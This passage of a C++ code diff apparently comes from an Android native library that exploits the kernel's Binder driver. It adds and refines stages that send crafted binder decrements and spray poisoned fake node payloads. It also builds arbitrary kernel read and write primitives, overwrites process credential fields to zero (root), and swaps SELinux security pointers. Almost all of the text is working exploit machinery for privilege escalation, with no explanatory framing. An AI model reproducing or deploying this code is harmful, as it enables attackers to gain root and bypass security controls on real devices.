                 " staged_expected=%d staged_active=%d staged_wake=%d"
-                " staged_state2=%d staged_stable=%d global_published=%d"
+                " staged_state2=%d staged_stable=%d"
+                " target_read_ready=%d read_go=%d boundary_signal=%d"
+                " victim_work_ready=%d read_continue=%d"
+                " global_published=%d"
                 " all_entered=%d all_state2=%d blocked=%d"
                 " read_rc=%d read_errno=%d read_consumed=%" PRIu64
                 " read_write_consumed=%" PRIu64
@@ -8993,6 +12293,11 @@ Java_com_vandam_prism_NativeBridge_prepareRawArbitraryRead(
                 split.staged_expected, split.staged_active,
                 split.staged_wake ? 1 : 0, split.staged_state2,
                 split.staged_stable ? 1 : 0,
+                split.target_read_ready ? 1 : 0,
+                split.read_go ? 1 : 0,
+                split.boundary_signal ? 1 : 0,
+                split.victim_work_ready ? 1 : 0,
+                split.read_continue ? 1 : 0,
                 split.global_published ? 1 : 0, split.all_entered ? 1 : 0,
                 split.all_state2, split.blocked, split.read_result,
                 split.read_errno,
@@ -9041,23 +12346,9 @@ Java_com_vandam_prism_NativeBridge_prepareRawArbitraryRead(
     }
     bool pass = false;
     if (candidate_pass && telemetry_complete) {
-        const std::string free_path =
-                directory + "/controlled-free.enable.0";
-        const std::string read_path =
-                directory + "/controlled-read.enable.0";
-        free_gate = write_text_file(free_path, "0");
-        enabled = free_gate && write_text_file(
-                read_path, "status=pass stage=arb-read-enable victim=0");
-        if (!free_gate || !enabled) {
-            gate_error = free_gate ? 2 : 1;
-            gate_unlinked_free = unlink(free_path.c_str()) == 0;
-            gate_unlinked_read = unlink(read_path.c_str()) == 0;
-            free_gate = false;
-            enabled = false;
-            reboot_required = true;
-        } else {
-            pass = true;
-        }
+        pass = split.gates_prepared && split.target_read_ready &&
+                split.read_go && split.victim_work_ready &&
+                split.read_continue;
     }
     if (!pass && candidate_pass && !telemetry_complete) {
         reboot_required = true;
@@ -9105,14 +12396,15 @@ Java_com_vandam_prism_NativeBridge_handoffRawArbitraryRead(
     int poison_count = 0;
     bool inactive_after = false;
     int expected_after = -1;
+    int expected_before = -1;
     {
         std::lock_guard<std::mutex> lock(g_fake_control_mutex);
         bool gate_clear = !g_terminal_fd_retirement_gate.load(
                 std::memory_order_acquire);
-        bool worker_valid = worker >= 0 &&
-                worker < kFakeControlSprayCount;
+        expected_before = g_fake_control_expected;
+        bool worker_valid = worker >= 0 && worker < expected_before;
         if (gate_clear && worker_valid && g_fake_control_active &&
-            g_fake_control_expected == kFakeControlSprayCount) {
+            expected_before == kFakeControlInitialSprayCount) {
             auto& slot = g_fake_control_slots[worker];
             std::uint32_t safe_check = 0;
             std::uint64_t pointer = 0;
@@ -9146,7 +12438,8 @@ Java_com_vandam_prism_NativeBridge_handoffRawArbitraryRead(
             }
         }
     }
-    bool pass = marked && released == kFakeControlSprayCount - 1 &&
+    bool pass = marked &&
+            released == kFakeControlInitialSprayCount - 1 &&
             retained_state2 && poison_count == 1 &&
             inactive_after && expected_after == 0 &&
             !g_terminal_fd_retirement_gate.load(std::memory_order_acquire);
@@ -9167,7 +12460,7 @@ Java_com_vandam_prism_NativeBridge_handoffRawArbitraryRead(
             " poison=%d replacement_spray=0"
             " reboot_required=%d",
             pass ? "pass" : "fail", worker, marked ? 1 : 0,
-            released, kFakeControlSprayCount - 1,
+            released, kFakeControlInitialSprayCount - 1,
             inactive_after ? 0 : 1, expected_after,
             retained_state2 ? 1 : 0, poison_count,
             pass ? 0 : 1);
@@ -9270,7 +12563,8 @@ bool validate_terminal_swapped_donor() {
     std::uint64_t header = 0;
     std::uint32_t sid = 0;
     return reliable_read64(g_direct_init_real_cred_slot, &helper_real) &&
-            helper_real == g_security_target_cred &&
+            helper_real == (g_direct_subjective_only
+                    ? g_private_cred : g_security_target_cred) &&
             reliable_read64(g_direct_init_cred_slot, &helper_cred) &&
             helper_cred == g_security_target_cred &&
             reliable_read64(
@@ -9334,7 +12628,7 @@ bool validate_direct_write_gate(std::uint64_t address, int victim) {
     bool donor_live = g_direct_terminal_cleanup &&
             g_direct_write_step == 6
             ? validate_terminal_swapped_donor()
-            : validate_live_security_target();
+            : validate_live_security_target(true);
     if (!g_direct_security_repair || g_direct_write_step < 1 ||
         g_direct_write_step > final_step ||
         address != root_write_target(g_direct_write_step) ||
@@ -9354,8 +12648,9 @@ bool validate_direct_write_gate(std::uint64_t address, int victim) {
     std::uint64_t donor_repair = UINT64_MAX;
     std::uint64_t helper_real_cred = 0;
     std::uint64_t helper_cred = 0;
-    std::uint64_t expected_helper_real = g_direct_write_step >= 4
-                    ? g_direct_cred_value : g_private_cred;
+    std::uint64_t expected_helper_real =
+            g_direct_subjective_only || g_direct_write_step < 4
+                    ? g_private_cred : g_direct_cred_value;
     std::uint64_t expected_helper_cred = g_direct_write_step >= 2
             ? g_direct_cred_value : g_private_cred;
     std::uint64_t expected_repair = g_direct_write_step == 2
@@ -9391,7 +12686,7 @@ bool validate_direct_write_gate(std::uint64_t address, int victim) {
     if (valid &&
         (g_direct_write_step == 1 || g_direct_write_step == 3)) {
         std::uint64_t snapshot_repair = UINT64_MAX;
-        valid = validate_zero_root_cred_snapshot(
+        valid = validate_zero_root_cred_snapshot_fast(
                 g_security_target_task, g_security_target_cred,
                 g_security_target_real_cred_slot,
                 g_security_target_cred_slot,
@@ -9402,35 +12697,10 @@ bool validate_direct_write_gate(std::uint64_t address, int victim) {
         g_last_write_observed_usage = static_cast<std::uint32_t>(
                 g_zero_snapshot_header);
     } else if (valid) {
-        std::uint64_t header = 0;
-        std::uint32_t uid = UINT32_MAX;
-        std::uint32_t sgid = UINT32_MAX;
-        std::uint64_t effective_ids = UINT64_MAX;
-        std::uint64_t fs_ids = UINT64_MAX;
-        valid = reliable_read64_allow_zero(
+        valid = validate_zero_identity_fields_fast(
                 g_security_target_cred,
-                g_security_target_cred_slot,
-                g_security_target_cred, &header) &&
-                static_cast<std::uint32_t>(header) == expected_usage &&
-                static_cast<std::uint32_t>(header >> 32U) == 0 &&
-                arbitrary_read32_allow_zero(
-                        g_security_target_cred + 4,
-                        g_security_target_cred_slot,
-                        g_security_target_cred, &uid) && uid == 0 &&
-                arbitrary_read32_allow_zero(
-                        g_security_target_cred + 16,
-                        g_security_target_cred_slot,
-                        g_security_target_cred, &sgid) && sgid == 0 &&
-                reliable_read64_allow_zero(
-                        g_security_target_cred + 20,
-                        g_security_target_cred_slot,
-                        g_security_target_cred, &effective_ids) &&
-                effective_ids == 0 &&
-                reliable_read64_allow_zero(
-                        g_security_target_cred + 28,
-                        g_security_target_cred_slot,
-                        g_security_target_cred, &fs_ids) && fs_ids == 0;
-        g_last_write_observed_usage = static_cast<std::uint32_t>(header);
+                g_security_target_cred_slot, expected_usage);
+        g_last_write_observed_usage = valid ? expected_usage : 0;
     }
     return valid;
 }
@@ -9459,6 +12729,39 @@ Java_com_vandam_prism_NativeBridge_validateRawWriteGate(
             pass ? 0 : 1, victim, g_direct_write_step,
             attempts, g_last_write_expected_usage,
             g_last_write_observed_usage, address);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_skipDirectRealCredWrites(
+        JNIEnv* environment, jclass) {
+    std::uint64_t helper_real = 0;
+    std::uint64_t helper_cred = 0;
+    std::uint64_t donor_repair = UINT64_MAX;
+    bool pass = g_direct_terminal_cleanup && g_direct_security_repair &&
+            !g_direct_subjective_only && g_direct_write_step == 3 &&
+            g_write_successes == 2 && !g_null_write_armed &&
+            reliable_read64(g_direct_init_real_cred_slot, &helper_real) &&
+            helper_real == g_private_cred &&
+            reliable_read64(g_direct_init_cred_slot, &helper_cred) &&
+            helper_cred == g_direct_cred_value &&
+            reliable_read64_allow_zero(
+                    g_security_target_cred + 8,
+                    g_security_target_cred_slot,
+                    g_security_target_cred, &donor_repair) &&
+            donor_repair == 0 && validate_live_security_target();
+    if (pass) {
+        g_direct_subjective_only = true;
+        g_direct_write_step = 5;
+    }
+    char state[320];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=direct-real-cred-skip"
+            " direct_step=%d successful_writes=%d"
+            " helper_real=0x%" PRIx64 " helper_cred=0x%" PRIx64
+            " donor_repair=0x%" PRIx64,
+            pass ? "pass" : "fail", g_direct_write_step,
+            g_write_successes, helper_real, helper_cred, donor_repair);
     return environment->NewStringUTF(state);
 }
 
@@ -9516,11 +12819,11 @@ Java_com_vandam_prism_NativeBridge_prepareRawNullWrite(
                 donor_repair == expected_repair;
         if (direct_state_valid &&
             (g_direct_write_step == 1 || g_direct_write_step == 3)) {
-            direct_state_valid = validate_live_security_target();
+            direct_state_valid = validate_live_security_target(true);
             for (int snapshot = 0;
                  direct_state_valid && snapshot < 2; ++snapshot) {
                 std::uint64_t snapshot_repair = UINT64_MAX;
-                direct_state_valid = validate_zero_root_cred_snapshot(
+                direct_state_valid = validate_zero_root_cred_snapshot_fast(
                         g_security_target_task,
                         g_security_target_cred,
                         g_security_target_real_cred_slot,
@@ -9635,6 +12938,393 @@ Java_com_vandam_prism_NativeBridge_prepareRawNullWrite(
     return environment->NewStringUTF(state);
 }
 
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_prepareRawNullWriteBatch(
+        JNIEnv* environment, jclass, jlongArray pointer_array,
+        jlongArray cookie_array, jstring directory_string) {
+    constexpr std::array<int, kFakeControlWriteBatchCount> logical_writes {
+            1, 2, 5, 6};
+    std::array<jlong, kFakeControlWriteBatchCount> pointers {};
+    std::array<jlong, kFakeControlWriteBatchCount> cookies {};
+    bool array_shape = pointer_array != nullptr && cookie_array != nullptr &&
+            environment->GetArrayLength(pointer_array) ==
+                    kFakeControlWriteBatchCount &&
+            environment->GetArrayLength(cookie_array) ==
+                    kFakeControlWriteBatchCount;
+    if (array_shape) {
+        environment->GetLongArrayRegion(
+                pointer_array, 0, pointers.size(), pointers.data());
+        environment->GetLongArrayRegion(
+                cookie_array, 0, cookies.size(), cookies.data());
+        array_shape = !environment->ExceptionCheck();
+    }
+    if (!array_shape || directory_string == nullptr) {
+        return environment->NewStringUTF(
+                "status=fail stage=null-write-batch-prepare"
+                " reason=arguments reboot_required=0");
+    }
+    const char* characters = environment->GetStringUTFChars(
+            directory_string, nullptr);
+    if (characters == nullptr) {
+        return environment->NewStringUTF(
+                "status=fail stage=null-write-batch-prepare"
+                " reason=directory reboot_required=0");
+    }
+    std::string directory(characters);
+    environment->ReleaseStringUTFChars(directory_string, characters);
+
+    std::array<std::uint64_t, kFakeControlWriteBatchCount> nodes {};
+    std::array<std::uint64_t, kFakeControlWriteBatchCount> targets {};
+    std::array<std::uint64_t, kFakeControlWriteBatchCount> values {
+            g_direct_cred_value,
+            0,
+            g_terminal_ueventd_security,
+            g_terminal_vendor_inode_security,
+    };
+    bool tokens_valid = true;
+    for (int index = 0; index < kFakeControlWriteBatchCount; ++index) {
+        nodes[index] = g_raw_victim_nodes[index + 1];
+        targets[index] = root_write_target(logical_writes[index]);
+        tokens_valid = tokens_valid && pointers[index] != 0 &&
+                cookies[index] != 0 && kernel_pointer(nodes[index]) &&
+                kernel_pointer(targets[index]);
+    }
+    bool preflight = tokens_valid && g_direct_init_target &&
+            g_direct_security_repair && g_direct_terminal_cleanup &&
+            !g_direct_subjective_only && g_direct_write_step == 1 &&
+            g_write_successes == 0 && !g_null_write_armed &&
+            g_null_write_batch_armed.empty() &&
+            !g_null_write_batch_prepared && g_arb_read_ready &&
+            g_raw_target_handle > 0 && g_terminal_ctlbuf_profile_valid &&
+            kernel_pointer(values[0]) && kernel_pointer(values[2]) &&
+            kernel_pointer(values[3]) &&
+            targets[0] == g_direct_init_cred_slot &&
+            targets[1] == g_security_target_cred + 8 &&
+            targets[2] == g_security_target_cred + kCredSecurityOffset &&
+            targets[3] == g_terminal_memfd_inode_security_slot &&
+            g_security_target_cred_repair == 0 &&
+            validate_direct_write_gate(targets[0], 1);
+    if (!preflight) {
+        return environment->NewStringUTF(
+                "status=fail stage=null-write-batch-prepare"
+                " reason=preflight reboot_required=0");
+    }
+
+    std::array<std::array<std::uint8_t, kFakeControlSize>,
+            kFakeControlWriteBatchCount> payloads {};
+    std::array<const std::uint8_t*, kFakeControlWriteBatchCount>
+            payload_pointers {};
+    for (int index = 0; index < kFakeControlWriteBatchCount; ++index) {
+        std::vector<std::uint8_t> payload = make_fake_node_payload(
+                nodes[index], values[index], targets[index], false);
+        std::copy(payload.begin(), payload.end(), payloads[index].begin());
+        payload_pointers[index] = payloads[index].data();
+    }
+
+    int prefilled = 0;
+    bool prepared = prepare_fake_control_spray(
+            payloads[0].data(), &prefilled, true,
+            kFakeControlWriteBatchStagedCount, payload_pointers.data(),
+            kFakeControlWriteBatchCount, kFakeControlWriteBatchGroupSize);
+    int expected = g_fake_control_expected;
+    bool stored = prepared &&
+            expected == kFakeControlWriteBatchStagedCount &&
+            poisoned_control_count() == 1;
+    if (!stored && prepared) {
+        release_fake_control_spray();
+    }
+    bool pass = stored;
+    if (pass) {
+        g_null_write_batch_prepared = true;
+        g_null_write_batch_next_victim = 1;
+    }
+    char state[512];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=null-write-batch-prepare"
+            " control_blocks=%d expected_blocks=%d"
+            " group_size=%d poison=%d prefilled=%d"
+            " reboot_required=0",
+            pass ? "pass" : "fail", expected,
+            kFakeControlWriteBatchStagedCount,
+            kFakeControlWriteBatchGroupSize,
+            poisoned_control_count(), prefilled);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_armRawNullWriteBatchVictim(
+        JNIEnv* environment, jclass, jint victim, jlong pointer,
+        jlong cookie, jstring directory_string) {
+    if (directory_string == nullptr) {
+        return environment->NewStringUTF(
+                "status=fail stage=null-write-batch-arm"
+                " reason=directory reboot_required=1");
+    }
+    const char* characters = environment->GetStringUTFChars(
+            directory_string, nullptr);
+    if (characters == nullptr) {
+        return environment->NewStringUTF(
+                "status=fail stage=null-write-batch-arm"
+                " reason=directory reboot_required=1");
+    }
+    std::string directory(characters);
+    environment->ReleaseStringUTFChars(directory_string, characters);
+
+    bool preflight = victim == g_null_write_batch_next_victim &&
+            victim > 0 && victim <= kFakeControlWriteBatchCount &&
+            g_null_write_batch_prepared &&
+            g_null_write_batch_armed.empty() && !g_null_write_armed &&
+            g_fake_control_active && g_fake_control_write_batch &&
+            pointer != 0 && cookie != 0 &&
+            static_cast<std::uint64_t>(pointer) ==
+                    g_raw_victim_pointers[victim] &&
+            static_cast<std::uint64_t>(cookie) ==
+                    g_raw_victim_cookies[victim] &&
+            poisoned_control_count() == victim;
+    if (!preflight) {
+        return environment->NewStringUTF(
+                "status=fail stage=null-write-batch-arm"
+                " reason=preflight reboot_required=1");
+    }
+
+    int fd = duplicate_binder_fd();
+    CveResult decrement;
+    if (fd >= 0) {
+        decrement = send_single_decrement(
+                fd, g_raw_target_handle,
+                static_cast<binder_uintptr_t>(pointer),
+                static_cast<binder_uintptr_t>(cookie));
+    }
+    bool decremented = fd >= 0 && decrement.ioctl_result == 0 &&
+            decrement.failed_reply && !decrement.dead_reply;
+    int blocked = decremented
+            ? activate_fake_control_write_group(victim) : 0;
+    if (fd >= 0) {
+        close(fd);
+    }
+    int expected = g_fake_control_expected;
+    bool stored = decremented &&
+            blocked == kFakeControlWriteBatchGroupSize;
+    std::string suffix = "." + std::to_string(victim);
+    bool gates = stored && write_text_file(
+                    directory + "/controlled-free.enable" + suffix, "0") &&
+            write_text_file(
+                    directory + "/controlled-read.enable" + suffix,
+                    "status=pass stage=null-write-batch-enable");
+    bool pass = stored && gates;
+    if (pass) {
+        ++g_null_write_batch_next_victim;
+    }
+    char state[640];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=null-write-batch-arm victim=%d"
+            " decrement=%d failed_reply=%d dead_reply=%d"
+            " control_blocks=%d expected_group=%d"
+            " expected_blocks=%d gates=%d"
+            " next_victim=%d reboot_required=%d",
+            pass ? "pass" : "fail", victim, decrement.ioctl_result,
+            decrement.failed_reply ? 1 : 0,
+            decrement.dead_reply ? 1 : 0, blocked,
+            kFakeControlWriteBatchGroupSize, expected,
+            gates ? 1 : 0, g_null_write_batch_next_victim,
+            pass ? 0 : 1);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_retainRawNullWriteBatchVictim(
+        JNIEnv* environment, jclass, jint victim, jint worker) {
+    constexpr std::array<int, kFakeControlWriteBatchCount> logical_writes {
+            1, 2, 5, 6};
+    std::lock_guard<std::mutex> lock(g_fake_control_mutex);
+    int poison_before = poisoned_control_count_locked();
+    bool valid = victim > 0 && victim <= kFakeControlWriteBatchCount &&
+            victim == g_null_write_batch_next_victim - 1 &&
+            g_null_write_batch_prepared &&
+            g_null_write_batch_armed.empty() &&
+            g_null_write_batch_selected.count(victim) == 0 &&
+            !g_null_write_armed && g_fake_control_active &&
+            g_fake_control_write_batch &&
+            worker >= 0 && worker < kFakeControlSlotCount &&
+            poison_before == victim;
+    if (valid) {
+        auto& slot = g_fake_control_slots[worker];
+        std::uint64_t target = root_write_target(
+                logical_writes[victim - 1]);
+        std::uint64_t value = victim == 1 ? g_direct_cred_value :
+                victim == 2 ? 0 : victim == 3
+                        ? g_terminal_ueventd_security
+                        : g_terminal_vendor_inode_security;
+        std::vector<std::uint8_t> expected_payload = make_fake_node_payload(
+                g_raw_victim_nodes[victim], value, target, false);
+        std::uint64_t indexed_pointer = kIndexedPtrBase |
+                static_cast<std::uint32_t>(worker);
+        std::uint64_t indexed_cookie = kIndexedCookieBase |
+                static_cast<std::uint32_t>(worker);
+        std::memcpy(expected_payload.data() + 88, &indexed_pointer,
+                    sizeof(indexed_pointer));
+        std::memcpy(expected_payload.data() + 96, &indexed_cookie,
+                    sizeof(indexed_cookie));
+        valid = slot.created && !slot.poisoned &&
+                slot.activation_group == victim &&
+                slot.state.load(std::memory_order_acquire) == 2 &&
+                std::memcmp(slot.payload, expected_payload.data(),
+                            kFakeControlSize) == 0;
+    }
+    if (!valid) {
+        return environment->NewStringUTF(
+                "status=fail stage=null-write-batch-retain-victim"
+                " reason=mapping reboot_required=1");
+    }
+
+    auto& selected = g_fake_control_slots[worker];
+    selected.poisoned = true;
+    selected.poison_victim = victim;
+    int released = release_fake_control_write_group_locked(victim, worker);
+    bool retained = released == kFakeControlWriteBatchGroupSize - 1 &&
+            selected.created && selected.poisoned &&
+            selected.poison_victim == victim &&
+            selected.state.load(std::memory_order_acquire) == 2 &&
+            poisoned_control_count_locked() == poison_before + 1;
+    if (retained) {
+        g_null_write_batch_selected.insert(victim);
+    }
+    if (retained && victim == kFakeControlWriteBatchCount) {
+        retained = g_null_write_batch_selected.size() ==
+                        kFakeControlWriteBatchCount &&
+                g_fake_control_expected == kFakeControlWriteBatchCount &&
+                poisoned_control_count_locked() ==
+                        kFakeControlWriteBatchCount + 1;
+        if (retained) {
+            g_fake_control_active = false;
+            g_fake_control_expected = 0;
+            g_fake_control_staged_limit = 0;
+            g_fake_control_staged_expected = 0;
+            g_fake_control_write_batch = false;
+            g_fake_control_gate.store(0, std::memory_order_relaxed);
+            g_fake_control_staged_gate.store(0,
+                                             std::memory_order_relaxed);
+            g_null_write_batch_prepared = false;
+            g_null_write_batch_armed = g_null_write_batch_selected;
+            g_null_write_batch_selected.clear();
+            g_write_victims_used += kFakeControlWriteBatchCount;
+        }
+    }
+    char state[512];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=null-write-batch-retain-victim"
+            " victim=%d worker=%d released=%d expected_release=%d"
+            " remaining=%d poison_before=%d poison_after=%d"
+            " selected=%zu armed=%zu reboot_required=%d",
+            retained ? "pass" : "fail", victim, worker, released,
+            kFakeControlWriteBatchGroupSize - 1,
+            g_fake_control_expected, poison_before,
+            poisoned_control_count_locked(),
+            g_null_write_batch_selected.size(),
+            g_null_write_batch_armed.size(), retained ? 0 : 1);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_retainRawNullWriteBatch(
+        JNIEnv* environment, jclass, jintArray worker_array) {
+    constexpr std::array<int, kFakeControlWriteBatchCount> logical_writes {
+            1, 2, 5, 6};
+    std::array<jint, kFakeControlWriteBatchCount> workers {};
+    bool array_shape = worker_array != nullptr &&
+            environment->GetArrayLength(worker_array) ==
+                    kFakeControlWriteBatchCount;
+    if (array_shape) {
+        environment->GetIntArrayRegion(
+                worker_array, 0, workers.size(), workers.data());
+        array_shape = !environment->ExceptionCheck();
+    }
+    if (!array_shape) {
+        return environment->NewStringUTF(
+                "status=fail stage=null-write-batch-retain"
+                " reason=arguments reboot_required=1");
+    }
+
+    std::lock_guard<std::mutex> lock(g_fake_control_mutex);
+    int expected = g_fake_control_expected;
+    int poison_before = poisoned_control_count_locked();
+    std::set<int> unique_workers;
+    bool valid = g_null_write_batch_prepared &&
+            g_null_write_batch_armed.empty() &&
+            !g_null_write_armed && g_fake_control_active &&
+            g_fake_control_write_batch && poison_before == 1;
+    for (int index = 0; valid && index < kFakeControlWriteBatchCount;
+         ++index) {
+        int worker = workers[index];
+        int victim = index + 1;
+        valid = worker >= 0 && worker < kFakeControlSlotCount &&
+                unique_workers.insert(worker).second;
+        if (!valid) {
+            break;
+        }
+        auto& slot = g_fake_control_slots[worker];
+        std::uint64_t target = root_write_target(logical_writes[index]);
+        std::uint64_t value = index == 0 ? g_direct_cred_value :
+                index == 1 ? 0 : index == 2
+                        ? g_terminal_ueventd_security
+                        : g_terminal_vendor_inode_security;
+        std::vector<std::uint8_t> expected_payload = make_fake_node_payload(
+                g_raw_victim_nodes[victim], value, target, false);
+        std::uint64_t pointer = kIndexedPtrBase |
+                static_cast<std::uint32_t>(worker);
+        std::uint64_t cookie = kIndexedCookieBase |
+                static_cast<std::uint32_t>(worker);
+        std::memcpy(expected_payload.data() + 88, &pointer, sizeof(pointer));
+        std::memcpy(expected_payload.data() + 96, &cookie, sizeof(cookie));
+        valid = slot.created && !slot.poisoned &&
+                slot.activation_group == victim &&
+                slot.state.load(std::memory_order_acquire) == 2 &&
+                std::memcmp(slot.payload, expected_payload.data(),
+                            kFakeControlSize) == 0;
+    }
+    if (!valid) {
+        return environment->NewStringUTF(
+                "status=fail stage=null-write-batch-retain"
+                " reason=mapping reboot_required=1");
+    }
+    for (int index = 0; index < kFakeControlWriteBatchCount; ++index) {
+        auto& slot = g_fake_control_slots[workers[index]];
+        slot.poisoned = true;
+        slot.poison_victim = index + 1;
+    }
+    int released = release_fake_control_spray_locked();
+    bool retained = released == expected - kFakeControlWriteBatchCount &&
+            !g_fake_control_active && g_fake_control_expected == 0 &&
+            poisoned_control_count_locked() ==
+                    poison_before + kFakeControlWriteBatchCount;
+    for (int index = 0; retained && index < kFakeControlWriteBatchCount;
+         ++index) {
+        const auto& slot = g_fake_control_slots[workers[index]];
+        retained = slot.poisoned && slot.poison_victim == index + 1 &&
+                slot.created &&
+                slot.state.load(std::memory_order_acquire) == 2;
+    }
+    if (retained) {
+        g_null_write_batch_prepared = false;
+        for (int victim = 1; victim <= kFakeControlWriteBatchCount;
+             ++victim) {
+            g_null_write_batch_armed.insert(victim);
+        }
+    }
+    char state[512];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=null-write-batch-retain"
+            " workers=%d,%d,%d,%d released=%d expected_release=%d"
+            " poison_before=%d poison_after=%d armed=%zu"
+            " reboot_required=%d",
+            retained ? "pass" : "fail", workers[0], workers[1],
+            workers[2], workers[3], released,
+            expected - kFakeControlWriteBatchCount, poison_before,
+            poisoned_control_count_locked(), g_null_write_batch_armed.size(),
+            retained ? 0 : 1);
+    return environment->NewStringUTF(state);
+}
+
 extern "C" JNIEXPORT jlong JNICALL
 Java_com_vandam_prism_NativeBridge_rootWriteTarget(
         JNIEnv*, jclass, jint victim) {
@@ -9665,7 +13355,11 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
         record_raw_unlink_stage(progress_fd,
                 "stage=isolated-lock-acquired victim=%d worker=%d", victim,
                 worker);
-        if (g_raw_isolated_state == IsolatedRetirementState::kProved &&
+        bool retirement_state_valid =
+                g_raw_isolated_state == IsolatedRetirementState::kProved ||
+                (victim == 0 && g_raw_isolated_state ==
+                        IsolatedRetirementState::kReferencesReleased);
+        if (retirement_state_valid &&
             g_raw_controlled_free_pending_victim == -1 &&
             g_raw_controlled_unlinks.count(victim) == 0) {
             controlled_generation = g_raw_isolated_generation;
@@ -9684,8 +13378,12 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
             return false;
         }
         std::lock_guard<std::mutex> lock(g_raw_isolated_mutex);
+        bool retirement_state_valid =
+                g_raw_isolated_state == IsolatedRetirementState::kProved ||
+                (victim == 0 && g_raw_isolated_state ==
+                        IsolatedRetirementState::kReferencesReleased);
         bool valid = g_raw_isolated_generation == controlled_generation &&
-                g_raw_isolated_state == IsolatedRetirementState::kProved &&
+                retirement_state_valid &&
                 g_raw_controlled_free_pending_victim == -1 &&
                 g_raw_controlled_unlinks.count(victim) == 0;
         if (valid) {
@@ -9697,7 +13395,9 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
         }
         return false;
     };
-    if (victim > 0 &&
+    bool batch_armed = victim > 0 &&
+            g_null_write_batch_armed.count(victim) == 1;
+    if (victim > 0 && !batch_armed &&
         (!g_null_write_armed || g_null_write_armed_victim != victim)) {
         return environment->NewStringUTF(
                 "status=fail stage=unlink-complete reason=unarmed"
@@ -9705,6 +13405,7 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
     }
     int expected_before = -1;
     bool victim0_handoff = false;
+    bool batch_retained = false;
     record_raw_unlink_stage(progress_fd,
             "stage=fake-control-lock-wait victim=%d worker=%d", victim,
             worker);
@@ -9728,8 +13429,16 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
                 "stage=fake-control-lock-acquired victim=%d worker=%d",
                 victim, worker);
         expected_before = g_fake_control_expected;
+        if (batch_armed && worker >= 0 &&
+            worker < kFakeControlSlotCount) {
+            const auto& slot = g_fake_control_slots[worker];
+            batch_retained = !g_fake_control_active &&
+                    expected_before == 0 && slot.poisoned &&
+                    slot.poison_victim == victim && slot.created &&
+                    slot.state.load(std::memory_order_acquire) == 2;
+        }
     }
-    int released = victim0_handoff ? 0 :
+    int released = victim0_handoff || batch_retained ? 0 :
             victim == 0 ? -1 : retain_poisoned_control(worker, victim);
     __android_log_print(ANDROID_LOG_INFO, "LP3BinderDirect",
                         "unlink victim=%d checkpoint=spray-released count=%d",
@@ -9743,8 +13452,12 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
                 " reboot_required=1");
     }
     if (victim > 0) {
-        g_null_write_armed = false;
-        g_null_write_armed_victim = -1;
+        if (batch_retained) {
+            g_null_write_batch_armed.erase(victim);
+        } else {
+            g_null_write_armed = false;
+            g_null_write_armed_victim = -1;
+        }
     }
     std::uint64_t file = g_disclosed_file_address.load();
     std::uint64_t analysed_file = file;
@@ -9895,6 +13608,33 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
             g_selected_epoll_watched_fd = candidates[0].watched_fd;
             g_arb_read_ready = true;
         }
+        int selected_epitem_index = -1;
+        int selected_epitem_kind = 0;
+        if (located && candidates.size() == 1) {
+            std::lock_guard<std::mutex> lock(g_epitem_mutex);
+            auto shared = std::find(g_epitem_fds.begin(),
+                                    g_epitem_fds.end(),
+                                    g_selected_epoll_fd);
+            if (shared != g_epitem_fds.end()) {
+                selected_epitem_index = static_cast<int>(
+                        shared - g_epitem_fds.begin()) - 1;
+                selected_epitem_kind = selected_epitem_index <
+                                kEpitemPreDrainCount
+                        ? 1 : 2;
+                if (selected_epitem_kind == 2) {
+                    selected_epitem_index -= kEpitemPreDrainCount;
+                }
+            } else {
+                auto probe = std::find(g_file_probe_epoll_fds.begin(),
+                                       g_file_probe_epoll_fds.end(),
+                                       g_selected_epoll_fd);
+                if (probe != g_file_probe_epoll_fds.end()) {
+                    selected_epitem_index = static_cast<int>(
+                            probe - g_file_probe_epoll_fds.begin());
+                    selected_epitem_kind = 3;
+                }
+            }
+        }
         __android_log_print(ANDROID_LOG_INFO, "LP3BinderDirect",
                             "unlink checkpoint=epoll-selected located=%d candidates=%zu",
                             located ? 1 : 0, candidates.size());
@@ -10033,6 +13773,7 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
                 " released=%d expected_release=%d poison=%d"
                 " initial=0x%x expected=0x%x matching_files=%d"
                 " selected_fd=%d selected_watched_fd=%d"
+                " selected_epitem_kind=%d selected_epitem_index=%d"
                 " candidates=%zu handoff=%d pre_free_indexed=%d"
                 " post_free_node_read=0 retained_worker=%d"
                 " canonical=%d original_owner=%d one_poison=%d"
@@ -10044,7 +13785,8 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
                 released, spray_expected_release,
                 poisoned_control_count(), value,
                 expected_a, matching_files, g_selected_epoll_fd,
-                g_selected_epoll_watched_fd,
+                g_selected_epoll_watched_fd, selected_epitem_kind,
+                selected_epitem_index,
                 node_candidates.size(), victim0_handoff ? 1 : 0,
                 pre_free_indexed ? 1 : 0, worker, canonical ? 1 : 0,
                 original_owner ? 1 : 0, one_poison ? 1 : 0,
@@ -10080,7 +13822,7 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
               expected_value == g_terminal_vendor_inode_security));
     std::uint64_t zero_control_address = g_security_target_cred_slot;
     std::uint64_t zero_expected_control = g_security_target_cred;
-    bool read_back = g_direct_security_repair
+    bool read_back = g_direct_security_repair && expected_value == 0
             ? reliable_read64_allow_zero(
                     address, zero_control_address,
                     zero_expected_control, &value)
